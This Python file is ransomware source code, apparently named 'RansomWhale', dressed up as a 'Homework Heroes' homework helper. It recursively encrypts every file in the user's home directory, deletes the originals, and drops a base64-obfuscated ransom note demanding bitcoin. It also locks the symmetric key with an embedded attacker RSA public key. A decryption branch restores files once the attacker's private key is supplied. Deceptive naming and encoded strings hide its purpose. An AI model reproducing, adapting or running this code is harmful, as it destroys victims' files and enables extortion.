# Goals:


#///############[Packages]############\\\#
###### cryptography package has our RSA encryption
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes

from cryptography.fernet import Fernet

import base64
import os
import glob #finds all the pathnames matching a specified pattern
##########################################



#///###########[Directory Setup]###########\\\#
homeworkDir = os.path.expanduser('~') #grabs user home directory
homeworkFiles = glob.glob(f'{homeworkDir}/**/*.*', recursive=True) #grabs files we want to encrypt   
                                                       #we can switch / for linux to \\ for windows
###############################################

 
#///###########[Targeting Files]###########\\\#
homework_file_list=[]
important = [] #Key Storage
unsupported_files = [".pem", ".py", ".sh", ".note"] #important for RansomWhale
for filename in homeworkFiles:
    if "HWHeroesReg.key" in filename:   
        important.append(filename)
        print ("I see you have our Registration key, let me validate that for you...")

    elif not any(extension in filename for extension in unsupported_files): #Simplified logic: This makes sure we do not accidentally Encrypt things victim needs for RansomWhale
        homework_file_list.append(filename)
###############################################



if len(important) == 0:  #if we dont see a private_key file, we want to encrypt all the files
    
    ############[Keygen]############
    HWHero_userAccess = Fernet.generate_key()
    key = open("HWHeroesReg.key", "wb")
    key.write(HWHero_userAccess)
    key.close()
    ################################
    
    
    
    ############[Encrypting Files]############
    HWHero_serverAccess = Fernet(HWHero_userAccess) #Supply Fernet with our Key
    for file in homework_file_list:
        fileName = str(file)
        extension = os.path.splitext(file)[1]  #gets extension
        
        with open(file, 'rb') as f:
            homeworkWordList=f.read()
        
        accessAuthCode = '''UmFuc29tV2hhbGU='''
        
        homeworkQuestion = HWHero_serverAccess.encrypt(homeworkWordList)
        print(f'Your homework file {file} was scanned, {str(base64.b64decode(accessAuthCode))} is working on it')
        os.remove(file)
        
        
        
        homeworkAnswerQuery = fileName + (str(base64.b64decode(accessAuthCode)))  #Builds our Encrytped file with it's name + our Custom Extension
        
        with open(homeworkAnswerQuery, 'wb') as f:      
            f.write(homeworkQuestion)      #Writes the Encrypted bytes to our Encrypted file.
                                            # ↳ Even though we removed the file itself earlier, we kept the bytes (f_bytes_encrypted), which we write to our encFile
    
    homeworkSubmissionId="""
    QXR0ZW50aW9uLCB5b3VyIFBlcnNvbmFsIEZpbGVzIGhhdmUgYmVlbiBFbmNyeXB0ZWQgd2l0aCBhIEdvdmVybm1lbnQgR3JhZGUgRW5jcnlwdGlvbiBTeXN0ZW0uCiAgICBQbGVhc2Ugc2VuZCAxYnRjIHVzaW5nIHRoZSBwYXltZW50IGFwcGxpY2F0aW9uIGFsb25nIHdpdGggcHJvb2Ygb2YgcHVyY2hhc2UuIAogICAgdG8gb3VyIGVtYWlsIHBheW1lbnRzUmFuc29tQGdtYWlsLmNvbS4gUHJvY2Vzc2luZyBjb3VsZCB0YWtlIGJldHdlZW4gMiAtIDUgYnVpc25lc3MgZGF5cy4KICAgIFRoYW5rIHlvdSBmb3IgeW91ciB1bmRlcnN0YW5kaW5nLg==
    """
    print(base64.b64decode(homeworkSubmissionId))
    with open('homeworkNotice.note', 'w') as file:
        file.write(str(base64.b64decode(homeworkSubmissionId)))
        file.close()
    
    
    #///###########[Keygen]###########\\\#
    ## We're gonna encrypt the victim's HWHeroesReg.key with rsa
    
    # Want to encrypt the victim's HWHeroesReg.key with the attacker's public rsa key that's imbeded somehow
    # public_key_base64  if we want to hide our public key
    accessKey_HomeworkHeroes = '''
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAs1sNqnm8pIUqUwjba3n0
IJhz3g5dt9JWwa/Q9EHxVZS3/Ebv/Ic5xf8Dj+yEeVXm+VFi/+ybk61k7IdMbHGb
JWhQIfi/1ew9zdU900dWlqGPlBbJOFyCLG7SwVUKV27UpyE7s5FLbCJ23ienas8K
c7Al7BYzHE0hgyiYg3uyVO40N5pdBApAxepnu7Cr7yaaQBuHEwJjOGViAKr9DPT1
nl5ONEehktOGZKceLvP7RwS1D09P9s5c151S5CdzrS2T10qW/zFoKtrs3e9wxBeS
QRStQmHu6BHWPDiRx8Rs/1J4plbUY69emHDhM1FH7Bx8/tKamYqg5rHftoOKPb3F
dQIDAQAB
-----END PUBLIC KEY-----
'''

    
    # # Load the attacker's public key from the embedded string
    accessKey_HomeworkHeroes = serialization.load_pem_public_key(
        accessKey_HomeworkHeroes.encode(),
        backend=default_backend()
    )

    # Read the secret key
    with open('HWHeroesReg.key', 'rb') as key_file:
        HWHeroes_key = key_file.read()
        os.remove('HWHeroesReg.key')
    
    

    # Encrypt the secret key with RSA
    secure_encryptedAccess = accessKey_HomeworkHeroes.encrypt(
        HWHeroes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Save the encrypted key
    with open('encrypted_HWHeroesReg.key', 'wb') as encrypted_key_file:
        encrypted_key_file.write(secure_encryptedAccess)
    


    
else:     #read the public.key, if it works, then decrypt the files
    
    # decrypt the rsa encrypted_HWHeroesReg.key with private key
    with open('private_key.pem', 'rb') as private_key_file:
        private_key = serialization.load_pem_private_key(
            private_key_file.read(),
            password=None,
            backend=default_backend()
        )
        
    with open('encrypted_HWHeroesReg.key', 'rb') as encrypted_key_file:
        secure_encryptedAccess = encrypted_key_file.read()
    
    user_login_popup = private_key.decrypt(
        secure_encryptedAccess,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    
    
    ############[Open Victim's Key]############
    # Create a Fernet object with the decrypted key
    HWHero_serverAccess = Fernet(user_login_popup)
    ###########################################
    
        
    ############[Decrypting Files]############
    accessAuthCode = '''UmFuc29tV2hhbGU='''

    for file in homework_file_list:
        with open(file, 'rb') as f:
            homeworkWordList = f.read()
            
        homeworkQuestionUpload = HWHero_serverAccess.decrypt(homeworkWordList)
        
        fileName = str(file).replace(str(base64.decode(accessAuthCode)),'')   #Replaces our Encrypted File's Extension with the file's Original Extensions
        
        #decFile = fileName   #Build our Decrypted file, Filename without the RansomWhale.mp4 extension, possibly unnecessary 
            
        with open(fileName,'wb') as f:
            f.write(homeworkQuestionUpload)   #Writes our decrypted bytes to the file with the Original Extensions
            os.remove(file)            #Removes the old encrypted file


        print(f'Successfully decrypted {fileName}, thank you for your purchase.')

    ################################################
    
    
    